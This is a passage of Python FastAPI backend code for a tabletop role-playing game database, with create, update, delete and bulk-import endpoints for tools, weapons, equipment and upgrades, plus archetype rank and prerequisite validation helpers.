def _tool_from_body(b: dict) -> dict:
    name = (b.get("name") or "").strip() or "Unnamed"
    tier = b.get("tier", "1")
    enc  = float(b.get("enc") or 0)
    method = (b.get("method") or "crafting").strip().lower()
    if method not in ("crafting","alchemy"): method = "crafting"
    desc = (b.get("description") or "").strip()
    consumable = bool(b.get("consumable"))
    if method == "alchemy":
        consumable = True
    tags = b.get("tags") or []
    if isinstance(tags, str):
        tags = [t.strip() for t in tags.split(",") if t.strip()]
    else:
        tags = [str(t).strip() for t in tags if str(t).strip()]
    out = {
        "name": name,
        "name_key": norm_key(name),
        "tier": str(tier),
        "enc": enc,
        "method": method,
        "description": desc,
        "consumable": consumable,
        "modifiers": _modifiers_from_body(b),
        "tags": tags,
    }
    out.update(_derive_for(method, tier))
    return out

def _ensure_alchemy_tools_consumable():
    col = get_col("tools")
    col.update_many(
        {"method": "alchemy", "consumable": {"$ne": True}},
        {"$set": {"consumable": True, "updated_at": _now_iso()}}
    )

@app.get("/tools")
def list_tools(q: str | None = Query(None)):
    col = get_col("tools")
    _ensure_alchemy_tools_consumable()
    filt = {}
    if q: filt["name_key"] = {"$regex": norm_key(q)}
    return {"status":"success","tools": list(col.find(filt, {"_id":0}))}

@app.post("/tools")
def create_tool(request: Request, body: dict = Body(...)):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("tools")
    doc = _tool_from_body(body)
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "item", doc, kind="tool")
        return {"status":"pending","submission": pending}
    # duplicate protection by name_key
    if col.find_one({"name_key": doc["name_key"]}):
        raise HTTPException(status_code=409, detail="Tool with same name already exists")
    doc["id"] = next_id_str("tools", padding=4)
    doc["created_at"] = _now_iso()
    col.insert_one(dict(doc))
    return {"status":"success","tool": {k:v for k,v in doc.items() if k!="_id"}}

@app.put("/tools/{tid}")
def update_tool(tid: str, request: Request, body: dict = Body(...)):
    require_auth(request, roles=["moderator","admin"])
    col = get_col("tools")
    old = col.find_one({"id": tid})
    if not old: raise HTTPException(status_code=404, detail="Not found")
    upd = _tool_from_body(body)
    # if name changed, ensure no duplicate
    if upd["name_key"] != old.get("name_key"):
        if col.find_one({"name_key": upd["name_key"]}):
            raise HTTPException(status_code=409, detail="Tool with same name already exists")
    upd["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"
    col.update_one({"id": tid}, {"$set": upd})
    return {"status":"success","tool": col.find_one({"id": tid},{"_id":0})}

@app.delete("/tools/{tid}")
def delete_tool(tid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    col = get_col("tools")
    r = col.delete_one({"id": tid})
    if r.deleted_count == 0: raise HTTPException(status_code=404, detail="Not found")
    return {"status":"success","deleted": tid}

@app.post("/tools/bulk_create")
def bulk_create_tools(request: Request, payload: dict = Body(...)):
    require_auth(request, roles=["moderator","admin"])
    method = (payload.get("method") or "crafting").strip().lower()
    if method not in ("crafting","alchemy"): method = "crafting"
    items = payload.get("items") or []
    if not isinstance(items, list) or not items:
        raise HTTPException(status_code=400, detail="items must be a non-empty list")

    col = get_col("tools")
    created, skipped = [], []
    for b in items:
        b = dict(b)
        b["method"] = method
        doc = _tool_from_body(b)
        if col.find_one({"name_key": doc["name_key"]}):
            skipped.append(doc["name"])  # duplicate protection
            continue
        doc["id"] = next_id_str("tools", padding=4)
        doc["created_at"] = datetime.datetime.utcnow().isoformat()+"Z"
        col.insert_one(dict(doc))
        created.append({k:v for k,v in doc.items() if k!="_id"})
    return {"status":"success","created": created, "skipped": skipped}

# --- NEW: Spell list meta (variants, bonuses, per-spell meta) ---
@app.get("/spell_lists/{list_id}/meta")
def get_spell_list_meta(list_id: str, request: Request):
    username, role = _optional_auth(request)
    col = get_col("spell_lists")
    doc = col.find_one({"id": list_id}, {"_id":0})
    if not _can_view_list(doc, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")
    return {
        "status": "success",
        "meta": {
            "variants": doc.get("variants", []),
            "bonuses": doc.get("bonuses", []),
            "spell_meta": doc.get("spell_meta", {})  # {spellId:{status,alt_name,flavor}}
        }
    }

@app.put("/spell_lists/{list_id}/meta")
async def put_spell_list_meta(list_id: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()
    col = get_col("spell_lists")
    doc = col.find_one({"id": list_id})
    if not _can_access_list(doc, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")

    updates = {}
    if "variants" in body:   updates["variants"]   = body.get("variants") or []
    if "bonuses" in body:    updates["bonuses"]    = body.get("bonuses") or []
    if "spell_meta" in body: updates["spell_meta"] = body.get("spell_meta") or {}

    if updates:
        col.update_one({"id": list_id}, {"$set": updates})
        doc = col.find_one({"id": list_id}, {"_id":0})

    return {
        "status": "success",
        "meta": {
            "variants": doc.get("variants", []),
            "bonuses": doc.get("bonuses", []),
            "spell_meta": doc.get("spell_meta", {})
        }
    }

# ---------- Weapons (inventory) ----------
from fastapi import Body

QUAL_PRICE_DIFF = {
    "Mediocre": -100, "Adequate": 0, "Good": 167, "Very Good": 1390,
    "Excellent": 5280, "Legendary": 15300, "Mythical": 38760,
    "Epic": 128000, "Divine": 614400, "Unreal": 921600,
}

def _damage_to_animarma(expr: str) -> str:
    # "2d6+4+M(REF)" -> "2 ID+4+M(MAG)"
    import re
    s = expr or ""
    s = re.sub(r'(\d+)\s*d6', r'\1 ID', s, flags=re.I)
    s = re.sub(r'M\(\s*[^)]+\)', 'M(MAG)', s)
    return s

def _as_list(x):
    if isinstance(x, list): return [str(v).strip() for v in x if str(v).strip()]
    if isinstance(x, str):  return [s for s in (v.strip() for v in x.split(",")) if s]
    return []

def _safe_int(val, default: int = 0) -> int:
    try:
        if val is None:
            return default
        if isinstance(val, bool):
            return int(val)
        if isinstance(val, (int, float)):
            return int(val)
        txt = str(val).strip()
        if not txt:
            return default
        return int(float(txt))
    except Exception:
        return default

def _safe_float(val, default: float = 0.0) -> float:
    try:
        if val is None:
            return default
        if isinstance(val, bool):
            return float(val)
        if isinstance(val, (int, float)):
            return float(val)
        txt = str(val).strip()
        if not txt:
            return default
        return float(txt)
    except Exception:
        return default

def _normalize_choice(choice: dict | None) -> dict | None:
    """Ensure choice metadata keeps restrict fields populated regardless of client shape."""
    if not isinstance(choice, dict):
        return None
    out = dict(choice)
    restrict_items: list[str] = []
    choices_items: list[str] = []
    for key in ("restrict", "choice_restrict", "restrict_list"):
        vals = out.get(key)
        if isinstance(vals, list):
            restrict_items.extend([str(v).strip() for v in vals if str(v).strip()])
    if not restrict_items:
        txt = (
            out.get("restrict_text")
            or out.get("choice_restrict")
            or out.get("restrict_list")
            or out.get("restrict")
            or out.get("restrict_string")
            or ""
        )
        if isinstance(txt, str):
            restrict_items = [s for s in (v.strip() for v in txt.split(",")) if s]
    if isinstance(out.get("choices"), list):
        choices_items = [str(v).strip() for v in out.get("choices") if str(v).strip()]
    elif isinstance(out.get("choices_text"), str):
        choices_items = [s for s in (v.strip() for v in out.get("choices_text").split(",")) if s]
    out["restrict"] = restrict_items
    if choices_items:
        out["choices"] = choices_items
    if "restrict_text" not in out:
        out["restrict_text"] = ",".join(restrict_items)
    if choices_items and "choices_text" not in out:
        out["choices_text"] = ",".join(choices_items)
    return out
def _modifiers_from_body(b: dict) -> list[dict]:
    """Normalize an optional modifiers list from payload."""
    mods_in = (b or {}).get("modifiers") or []
    if not isinstance(mods_in, list):
        return []
    mods: list[dict] = []
    for m in mods_in:
        if not isinstance(m, dict):
            continue
        target = (m.get("target") or m.get("key") or "").strip()
        if not target:
            continue
        mode = (m.get("mode") or "add").lower()
        if mode not in ("add", "mul", "set"):
            mode = "add"
        try:
            value = float(m.get("value") or 0)
        except Exception:
            value = 0.0
        note = (m.get("note") or "").strip()
        mod = {"target": target, "mode": mode, "value": value, "note": note}
        group = (m.get("group") or "").strip()
        if group:
            mod["group"] = group
            try:
                gmax = int(m.get("group_max_choices") or m.get("group_max") or 1)
            except Exception:
                gmax = 1
            mod["group_max_choices"] = max(0, gmax)
        choice = _normalize_choice(m.get("choice") if isinstance(m.get("choice"), dict) else None)
        if choice:
            mod["choice"] = choice
        mods.append(mod)
    return mods

def _weapon_from_body(b: dict) -> dict:
    name  = (b.get("name") or "").strip() or "Unnamed"
    skill = (b.get("skill") or "Technicity").strip().title()
    desc  = (b.get("description") or "").strip()
    dmg   = (b.get("damage") or "").strip()
    rng   = str(b.get("range") or "").strip()
    hands = _safe_int(b.get("hands"), 1)
    price = _safe_int(b.get("price"), 0)
    enc   = _safe_float(b.get("enc"), 0.0)
    magazine_size = _safe_int(b.get("magazine_size") or b.get("magazine"), 0)
    fx    = _as_list(b.get("effects"))
    tags = b.get("tags") or []
    if isinstance(tags, str):
        tags = [t.strip() for t in tags.split(",") if t.strip()]
    else:
        tags = [str(t).strip() for t in tags if str(t).strip()]

    ups = _as_list(b.get("upgrades"))
    doc = {
        "name": name,
        "name_key": norm_key(name),
        "skill": skill,                 # Technicity | Brutality | Accuracy | Aura
        "description": desc,
        "damage": dmg,
        "range": rng,
        "hands": hands,
        "effects": fx,
        "price": price,                 # base price (quality applied client-side when needed)
        "enc": enc,
        "magazine_size": magazine_size,
        "is_animarma": bool(b.get("is_animarma") or False),
        "nature": (b.get("nature") or "").strip(),  # optional, can be edited later
        "modifiers": _modifiers_from_body(b),
        "upgrades": ups,
        "tags": tags,
    }
    return doc

def _make_animarma(base: dict) -> dict:
    a = dict(base)
    a["is_animarma"] = True
    a["name"] = f'{base["name"]} (Animarma)'
    a["name_key"] = norm_key(a["name"])
    a["damage"] = _damage_to_animarma(base.get("damage",""))
    a["price"] = int(base.get("price",0)) + 100
    a["enc"] = round(float(base.get("enc",0)) / 2.0, 2)
    # same skill, hands, range, effects, nature
    return a

@app.get("/weapons")
def list_weapons(q: str | None = Query(None)):
    col = get_col("weapons")
    filt = {}
    if q:
        filt["name_key"] = {"$regex": norm_key(q)}
    return {"status":"success","weapons": list(col.find(filt, {"_id":0}))}

@app.post("/weapons")
def create_weapon(request: Request, body: dict = Body(...)):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("weapons")

    base = _weapon_from_body(body)
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "item", base, kind="weapon")
        return {"status":"pending","submission": pending}
    if col.find_one({"name_key": base["name_key"]}):
        raise HTTPException(status_code=409, detail="Weapon with same name already exists")

    base["id"] = next_id_str("weapons", padding=4)
    now = _now_iso()
    base["created_at"] = now
    col.insert_one(dict(base))

    # auto-create animarma
    anim = _make_animarma(base)
    if not col.find_one({"name_key": anim["name_key"]}):
        anim["id"] = next_id_str("weapons", padding=4)
        anim["created_at"] = now
        col.insert_one(dict(anim))

    out = {k:v for k,v in base.items() if k!="_id"}
    return {"status":"success","weapon": out}

@app.put("/weapons/{wid}")
def update_weapon(wid: str, request: Request, body: dict = Body(...)):
    require_auth(request, roles=["moderator","admin"])
    col = get_col("weapons")
    old = col.find_one({"id": wid})
    if not old: raise HTTPException(status_code=404, detail="Not found")

    upd = _weapon_from_body(body)
    # if renaming, prevent duplicates
    if upd["name_key"] != old.get("name_key"):
        if col.find_one({"name_key": upd["name_key"]}):
            raise HTTPException(status_code=409, detail="Weapon with same name already exists")
    upd["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"
    col.update_one({"id": wid}, {"$set": upd})
    return {"status":"success","weapon": col.find_one({"id": wid},{"_id":0})}

@app.delete("/weapons/{wid}")
def delete_weapon(wid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    col = get_col("weapons")
    r = col.delete_one({"id": wid})
    if r.deleted_count == 0: raise HTTPException(status_code=404, detail="Not found")
    return {"status":"success","deleted": wid}

@app.post("/weapons/bulk_create")
def bulk_create_weapons(request: Request, payload: dict = Body(...)):
    require_auth(request, roles=["moderator","admin"])
    skill = (payload.get("skill") or "Technicity").strip().title()
    items = payload.get("items") or []
    replace_dup = bool(payload.get("replace_duplicates") or payload.get("replace_dup") or False)
    if not isinstance(items, list) or not items:
        raise HTTPException(status_code=400, detail="items must be a non-empty list")

    col = get_col("weapons")
    created, skipped = [], []
    now = datetime.datetime.utcnow().isoformat()+"Z"

    for idx, b in enumerate(items):
        if not isinstance(b, dict):
            raise HTTPException(status_code=400, detail=f"item {idx+1} is not an object")
        base = _weapon_from_body({**b, "skill": skill, "is_animarma": False})
        existing = col.find_one({"name_key": base["name_key"]})
        if existing:
            if not replace_dup:
                skipped.append(base["name"]); continue
            col.update_one({"_id": existing["_id"]}, {"$set": {**base, "updated_at": now}})
            base["id"] = existing.get("id")
            created.append({k:v for k,v in base.items() if k!="_id"})
        else:
            base["id"] = next_id_str("weapons", padding=4)
            base["created_at"] = now
            col.insert_one(dict(base))
            created.append({k:v for k,v in base.items() if k!="_id"})

        # auto-create animarma twin
        anim = _make_animarma(base)
        existing_anim = col.find_one({"name_key": anim["name_key"]})
        if existing_anim:
            if replace_dup:
                col.update_one({"_id": existing_anim["_id"]}, {"$set": {**anim, "updated_at": now}})
                anim["id"] = existing_anim.get("id")
                created.append({k:v for k,v in anim.items() if k!="_id"})
        else:
            anim["id"] = next_id_str("weapons", padding=4)
            anim["created_at"] = now
            col.insert_one(dict(anim))
            created.append({k:v for k,v in anim.items() if k!="_id"})

    return {"status":"success","created": created, "skipped": skipped}

@app.post("/admin/weapons/clear")
def clear_weapons(request: Request, payload: dict = Body(...)):
    require_auth(request, roles=["admin"])
    confirm = (payload or {}).get("confirm") or ""
    if confirm != "DELETE_ALL_WEAPONS":
        raise HTTPException(status_code=400, detail="confirm must be DELETE_ALL_WEAPONS")
    col = get_col("weapons")
    res = col.delete_many({})
    get_col("counters").update_one({"_id": "weapons"}, {"$set": {"seq": 0}}, upsert=True)
    return {"status": "success", "deleted": res.deleted_count}

# ---------- Equipment ----------
from fastapi import Body

def _eq_norm_name(name: str, fallback: str = "Unnamed") -> tuple[str, str]:
    nm = (name or "").strip() or fallback
    return nm, norm_key(nm)

def _fs():
    return gridfs.GridFS(get_db())

# ---------- Archetypes ----------
def _archetype_rank_for_level(lvl: int) -> int:
    # Provided table (level: rank)
    # 1->4, 10->5, 20->6, 30->7, 40->8, 50->9, 60->10, 70->11, 80->12
    thresholds = [(80,12),(70,11),(60,10),(50,9),(40,8),(30,7),(20,6),(10,5),(1,4)]
    lvl = max(1, int(lvl or 1))
    for lv, rk in thresholds:
        if lvl >= lv:
            return rk
    return 1

def _total_from_invest(v: int) -> int:
    try:
        return int(v or 0) + 4
    except Exception:
        return 0

def _validate_ranked_doc(doc: dict, is_update=False, allow_hybrid=False):
    required = ["name","ranks"]
    if not is_update:
        for k in required:
            if k not in doc: raise HTTPException(400, f"Missing field {k}")
    doc["name"] = (doc.get("name") or "Archetype").strip()
    if allow_hybrid:
        doc["hybrid"] = bool(doc.get("hybrid") or False)
        doc["sources"] = [str(s).strip() for s in (doc.get("sources") or []) if str(s).strip()] if doc.get("hybrid") else []
    else:
        doc.pop("hybrid", None)
        doc.pop("sources", None)
    doc["prereq_text"] = (doc.get("prereq_text") or "").strip()
    doc["description_html"] = (doc.get("description_html") or doc.get("description") or "").strip()
    linked_skills = doc.get("linked_skills") or []
    if isinstance(linked_skills, list):
        doc["linked_skills"] = [str(s).strip() for s in linked_skills if str(s).strip()]
    elif isinstance(linked_skills, str):
        doc["linked_skills"] = [s.strip() for s in linked_skills.split(",") if s.strip()]
    else:
        doc["linked_skills"] = []
    rules = doc.get("prereq_rules") or {}
    # structured prereqs
    allowed_keys = {"mag_highest","wis_half_mag","char_min","char_order","char_order_any"}
    doc["prereq_rules"] = {k:v for k,v in rules.items() if k in allowed_keys}
    if "char_min" in doc["prereq_rules"]:
        cm = doc["prereq_rules"]["char_min"] or {}
        if not isinstance(cm, dict): cm = {}
        clean = {}
        for k,v in cm.items():
            try: clean[str(k)] = int(v)
            except Exception: continue
        doc["prereq_rules"]["char_min"] = clean
    # normalized characteristic ranking rules (highest / second / third)
    if "char_order" in doc["prereq_rules"]:
        co = doc["prereq_rules"]["char_order"] or []
        if not isinstance(co, list): co = []
        cleaned_co = []
        for entry in co:
            if not isinstance(entry, dict): continue
            key = str(entry.get("key") or "").strip()
            try:
                pos = int(entry.get("position") or 0)
            except Exception:
                continue
            if not key or pos not in (1,2,3):
                continue
            cleaned_co.append({"key": key, "position": pos})
        doc["prereq_rules"]["char_order"] = cleaned_co
    else:
        # migrate legacy mag_highest into char_order for consistency
        co = []
        if rules.get("mag_highest"):
            co.append({"key":"magic","position":1})
        doc["prereq_rules"]["char_order"] = co
    # normalize "any of" highest/second/third
    if "char_order_any" in doc["prereq_rules"]:
        alias = {
            "ref":"reflex","reflex":"reflex",
            "dex":"dexterity","dexterity":"dexterity",
            "bod":"body","body":"body",
            "wis":"wisdom","wisdom":"wisdom",
            "pre":"presence","presence":"presence",
            "mag":"magic","magic":"magic",
            "wil":"willpower","willpower":"willpower",
            "tec":"tech","tech":"tech",
        }
        co = doc["prereq_rules"]["char_order_any"] or []
        if not isinstance(co, list): co = []
        cleaned = []
        for entry in co:
            if not isinstance(entry, dict): continue
            try:
                pos = int(entry.get("position") or 0)
            except Exception:
                continue
            keys = entry.get("keys") or entry.get("key") or []
            if isinstance(keys, str):
                keys = [k.strip() for k in keys.split(",") if k.strip()]
            if not isinstance(keys, list):
                continue
            clean_keys = []
            for k in keys:
                norm = alias.get(str(k).strip().lower(), "")
                if norm:
                    clean_keys.append(norm)
            if not clean_keys or pos not in (1,2,3):
                continue
            cleaned.append({"position": pos, "keys": clean_keys})
        doc["prereq_rules"]["char_order_any"] = cleaned

    ranks = doc.get("ranks") or []
    if not isinstance(ranks, list):
        raise HTTPException(400, "ranks must be a list")
    seen_rank = set()
    cleaned = []
    for r in ranks:
        if not isinstance(r, dict): continue
        try: rk = int(r.get("rank"))
        except Exception: continue
        if rk <=0: continue
        if rk in seen_rank: raise HTTPException(400, f"Duplicate rank {rk}")
        seen_rank.add(rk)
        ab_id = str(r.get("ability_id") or "").strip()
        if not ab_id: raise HTTPException(400, f"Rank {rk} missing ability_id")
        version = int(r.get("version") or 1)
        original_rank = int(r.get("original_rank") or rk)
        replaces = str(r.get("replaces_id") or "").strip()
        if version > 1 and not replaces:
            raise HTTPException(400, f"Rank {rk} version {version} must specify replaces_id")
        if rk < original_rank:
            raise HTTPException(400, f"Rank {rk} cannot be earlier than original_rank {original_rank}")
        cleaned.append({
            "rank": rk,
            "ability_id": ab_id,
            "version": version,
            "original_rank": original_rank,
            "replaces_id": replaces,
            "note": (r.get("note") or "").strip(),
        })
    cleaned.sort(key=lambda x: x["rank"])
    doc["ranks"] = cleaned
    return doc

def _validate_archetype_doc(doc: dict, is_update=False):
    return _validate_ranked_doc(doc, is_update=is_update, allow_hybrid=True)

def _validate_expertise_doc(doc: dict, is_update=False):
    return _validate_ranked_doc(doc, is_update=is_update, allow_hybrid=False)

def _validate_divine_manifestation_doc(doc: dict, is_update=False):
    return _validate_ranked_doc(doc, is_update=is_update, allow_hybrid=False)

def _validate_awakening_doc(doc: dict, is_update=False):
    return _validate_ranked_doc(doc, is_update=is_update, allow_hybrid=False)

def _compute_archetype_unlocked(archetype: dict, lvl: int) -> list[str]:
    eff_rank = _archetype_rank_for_level(lvl)
    ranks = archetype.get("ranks") or []
    unlocked = []
    for r in ranks:
        if r.get("rank", 0) <= eff_rank:
            unlocked.append(r)
    # apply replacements: keep highest version per chain
    keep_ids = []
    replaced = set()
    by_ab = {r["ability_id"]: r for r in unlocked}
    docs_by_id = {d.get("id"): d for d in _load_abilities_by_id([r["ability_id"] for r in unlocked])}
    for r in unlocked:
        rep = r.get("replaces_id")
        if rep and rep in by_ab:
            replaced.add(rep)
        ab = docs_by_id.get(r.get("ability_id"))
        rep_doc = (ab or {}).get("archetype_replaces")
        if rep_doc and rep_doc in by_ab:
            replaced.add(rep_doc)
    for r in unlocked:
        if r["ability_id"] in replaced:
            continue
        keep_ids.append(r["ability_id"])
    return keep_ids

def _archetype_prereq_errors(archetype: dict, stats: dict) -> list[str]:
    rules = archetype.get("prereq_rules") or {}
    if not rules or not (
        rules.get("mag_highest")
        or rules.get("wis_half_mag")
        or (rules.get("char_order") or [])
        or (rules.get("char_min") or {})
    ):
        return []
    if not stats:
        return ["No stats provided for prerequisite check."]
    errors = []
    char_keys = ["reflex","dexterity","body","wisdom","presence","magic","willpower","tech"]
    def mod_for(k):
        try:
            return _total_from_invest(stats.get(k,{}).get("invest",0))
        except Exception:
            return 0
    mod_map = {k: mod_for(k) for k in char_keys}
    if rules.get("mag_highest"):
        mag = mod_map["magic"]
        others = [mod_map[k] for k in char_keys if k!="magic"]
        if not all(mag >= o for o in others):
            errors.append(f"Magic mod {mag} is not highest (others: {max(others) if others else 0}).")
    if rules.get("wis_half_mag"):
        wis = mod_map["wisdom"]
        mag = mod_map["magic"]
        if wis < (mag/2):
            errors.append(f"Wisdom mod {wis} is below half of Magic {mag}.")
    order_rules = rules.get("char_order") or []
    if order_rules:
        vals = [(k, mod_map[k]) for k in char_keys]
        vals.sort(key=lambda kv: (-kv[1], kv[0]))
        rank_pos = {k:i+1 for i,(k,_) in enumerate(vals)}  # 1-based
        for r in order_rules:
            key = r.get("key")
            pos = int(r.get("position") or 0)
            if key not in rank_pos or pos not in (1,2,3):
                continue
            my_val = mod_map[key]
            higher_count = sum(1 for k,v in vals if v > my_val)
            if pos == 1 and higher_count != 0:
                errors.append(f"{key.title()} is not highest (mod {my_val}, higher mods exist).")
            # For 2nd / 3rd place, allow the stat to be higher than required (e.g., being 1st also satisfies "2nd highest").
            # We only fail if the stat ranks lower than the requested position.
            if pos == 2 and higher_count > 1:
                errors.append(f"{key.title()} must be in the top 2 (mod {my_val}, current rank {higher_count+1}).")
            if pos == 3 and higher_count > 2:
                errors.append(f"{key.title()} must be in the top 3 (mod {my_val}, current rank {higher_count+1}).")
    any_rules = rules.get("char_order_any") or []
    if any_rules:
        vals = [(k, mod_map[k]) for k in char_keys]
        vals.sort(key=lambda kv: (-kv[1], kv[0]))
        for r in any_rules:
            pos = int(r.get("position") or 0)
            keys = [str(k).strip() for k in (r.get("keys") or []) if str(k).strip()]
            if pos not in (1,2,3) or not keys:
                continue
            ok = False
            for key in keys:
                if key not in mod_map:
                    continue
                my_val = mod_map[key]
                higher_count = sum(1 for k,v in vals if v > my_val)
                if pos == 1 and higher_count == 0:
                    ok = True
                if pos == 2 and higher_count <= 1:
                    ok = True
                if pos == 3 and higher_count <= 2:
                    ok = True
                if ok:
                    break
            if not ok:
                label = " / ".join([k.title() for k in keys])
                errors.append(f"{label} must be in the top {pos} (none match).")
    char_min = rules.get("char_min") or {}
    for k,v in char_min.items():
        try:
            req = int(v)
            if mod_map.get(k, 0) < req:
                errors.append(f"{k.title()} mod {mod_map.get(k,0)} below minimum {req}.")
        except Exception:
            continue
    return errors

def _check_archetype_prereqs(archetype: dict, stats: dict) -> bool:
    return len(_archetype_prereq_errors(archetype, stats)) == 0

def _equipment_from_body(b: dict) -> dict:
    cat = (b.get("category") or "").strip().lower()
    if cat not in ("special","slot","armor"):
        raise HTTPException(status_code=400, detail="category must be special | slot | armor")
    slot = (b.get("slot") or "").strip().lower()
    if slot in ("arm","leg"):
        slot = slot + "s"
    if slot and slot not in EQUIPMENT_SLOTS:
        raise HTTPException(status_code=400, detail="slot must be one of head/arms/legs/accessory/chest")
    tags = b.get("tags") or []
    if isinstance(tags, str):
        tags = [t.strip() for t in tags.split(",") if t.strip()]
    else:
        tags = [str(t).strip() for t in tags if str(t).strip()]

    if cat == "special":
        name, key = _eq_norm_name(b.get("name"))
        eff = b.get("effects")
        if isinstance(eff, str): effects = [s for s in (x.strip() for x in eff.split(",")) if s]
        else: effects = [str(x).strip() for x in (eff or []) if str(x).strip()]
        doc = {
            "category":"special",
            "name": name, "name_key": key,
            "description": (b.get("description") or "").strip(),
            "damage": (b.get("damage") or "").strip(),
            "range": str(b.get("range") or "").strip(),
            "hands": int(b.get("hands") or 1),
            "effects": effects,
            "slot": slot or "",
            "price": int(b.get("price") or 0),
            "enc": float(b.get("enc") or 0),
            "modifiers": _modifiers_from_body(b),
            "tags": tags,
        }
        return doc

    if cat == "slot":
        slot = slot or "head"
        style = (b.get("style") or "").strip() or "Unnamed"
        name = f"{slot}:{style}"
        doc = {
            "category":"slot",
            "slot": slot,
            "style": style,
            "name": name, "name_key": norm_key(name),
            "description": (b.get("description") or "").strip(),
            "price": int(b.get("price") or 0),
            "enc": float(b.get("enc") or 0),
            "modifiers": _modifiers_from_body(b),
            "tags": tags,
        }
        return doc

    # armor
    slot = slot or "chest"
    tname, key = _eq_norm_name(b.get("type"), "Armor")
    doc = {
        "category":"armor",
        "slot": slot,
        "type": tname,
        "name": f"armor:{tname}", "name_key": norm_key(f"armor:{tname}"),
        "enc": float(b.get("enc") or 0),
        "receptacle": (b.get("receptacle") or "").strip(),
        "hp_bonus": int(b.get("hp_bonus") or 0),
        "effect": (b.get("effect") or "").strip(),
        "mo_penalty": int(b.get("mo_penalty") or 0),
        "price": int(b.get("price") or 2528),
        "modifiers": _modifiers_from_body(b),
        "upgrades": _as_list(b.get("upgrades")),
        "tags": tags,
    }
    return doc

@app.get("/equipment")
def list_equipment(q: str | None = Query(None), category: str | None = Query(None)):
    col = get_col("equipment")
    filt = {}
    if q: filt["name_key"] = {"$regex": norm_key(q)}
    if category: filt["category"] = category
    return {"status":"success","equipment": list(col.find(filt, {"_id":0}))}

@app.post("/equipment")
def create_equipment(request: Request, body: dict = Body(...)):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("equipment")
    doc = _equipment_from_body(body)
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "item", doc, kind="equipment")
        return {"status":"pending","submission": pending}
    if col.find_one({"category": doc["category"], "name_key": doc["name_key"]}):
        raise HTTPException(status_code=409, detail="Duplicate equipment")
    doc["id"] = next_id_str("equipment", padding=4)
    doc["created_at"] = _now_iso()
    col.insert_one(dict(doc))
    return {"status":"success","equipment": {k:v for k,v in doc.items() if k!="_id"}}

@app.put("/equipment/{eid}")
def update_equipment(eid: str, request: Request, body: dict = Body(...)):
    require_auth(request, roles=["moderator","admin"])
    col = get_col("equipment")
    old = col.find_one({"id": eid})
    if not old: raise HTTPException(status_code=404, detail="Not found")
    upd = _equipment_from_body(body)
    if upd["name_key"] != old.get("name_key") or upd["category"] != old.get("category"):
        if col.find_one({"category": upd["category"], "name_key": upd["name_key"]}):
            raise HTTPException(status_code=409, detail="Duplicate equipment")
    upd["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"
    col.update_one({"id": eid}, {"$set": upd})
    return {"status":"success","equipment": col.find_one({"id": eid}, {"_id":0})}

@app.delete("/equipment/{eid}")
def delete_equipment(eid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    col = get_col("equipment")
    r = col.delete_one({"id": eid})
    if r.deleted_count == 0: raise HTTPException(status_code=404, detail="Not found")
    return {"status":"success","deleted": eid}

@app.post("/equipment/bulk_create")
def bulk_create_equipment(request: Request, payload: dict = Body(...)):
    require_auth(request, roles=["moderator","admin"])
    kind = (payload.get("kind") or "").strip().lower()
    items = payload.get("items") or []
    if kind not in ("special","slot","armor") or not isinstance(items, list) or not items:
        raise HTTPException(status_code=400, detail="Provide kind (special|slot|armor) and items[]")

    col = get_col("equipment")
    created, skipped = [], []
    now = datetime.datetime.utcnow().isoformat()+"Z"

    for b in items:
        b = dict(b); b["category"] = kind
        doc = _equipment_from_body(b)
        if col.find_one({"category": doc["category"], "name_key": doc["name_key"]}):
            skipped.append(doc.get("name") or doc.get("type") or doc.get("style")); continue
        doc["id"] = next_id_str("equipment", padding=4)
        doc["created_at"] = now
        col.insert_one(dict(doc))
        created.append({k:v for k,v in doc.items() if k!="_id"})

    return {"status":"success","created": created, "skipped": skipped}

# ---------- Upgrades Catalog ----------
def _upgrade_from_body(body: dict) -> dict:
    kind = (body.get("kind") or "").strip().lower()
    # allow UI to send broader item_types but still enforce core kind
    item_types_in = body.get("item_types") or body.get("target_types") or []
    if isinstance(item_types_in, str):
        item_types = [x.strip().lower() for x in item_types_in.split(",") if x.strip()]
    else:
        item_types = [str(x).strip().lower() for x in item_types_in if str(x).strip()]
    # default kind based on selection
    if not kind:
        kind = "weapon" if "weapon" in item_types else "equipment"

    if kind not in ("weapon","equipment"):
        raise HTTPException(status_code=400, detail="kind must be weapon|equipment")
    slot = (body.get("slot") or "").strip().lower()
    slots_in = body.get("slots") or []
    slots = [str(s).strip().lower() for s in slots_in if str(s).strip()]
    if kind == "equipment":
        valid_slots = set(EQUIPMENT_SLOTS)
        if slot and slot not in valid_slots:
            raise HTTPException(status_code=400, detail="slot must be one of head/arms/legs/accessory/chest")
        slots = [s for s in slots if s in valid_slots]
    else:
        slot = ""
        slots = []

    name, key = _eq_norm_name(body.get("name"), "Upgrade")
    unique = bool(body.get("unique", False))

    holder_src = body
    if isinstance(body.get("holder_modifiers"), list):
        holder_src = {"modifiers": body.get("holder_modifiers")}
    holder_mods = _modifiers_from_body(holder_src)
    modifiers = holder_mods or _modifiers_from_body(body)
    targets = body.get("targets")
    if isinstance(targets, str):
        targets = [t.strip() for t in targets.split(",") if t.strip()]
    if targets and not isinstance(targets, list):
        targets = []
    exclusive_group = (body.get("exclusive_group") or body.get("exclusive") or "").strip().lower()

    item_effects = body.get("item_effects")
    if not isinstance(item_effects, list):
        item_effects = []

    desc_html = (body.get("description_html") or body.get("description") or "").strip()
    tags_in = body.get("tags") or body.get("tag") or body.get("tags_text") or body.get("tags_str") or ""
    if isinstance(tags_in, list):
        tags = [str(t).strip().lower() for t in tags_in if str(t).strip()]
    elif isinstance(tags_in, str):
        tags = [t.strip().lower() for t in tags_in.split(",") if t.strip()]
    else:
        tags = []
    if not tags:
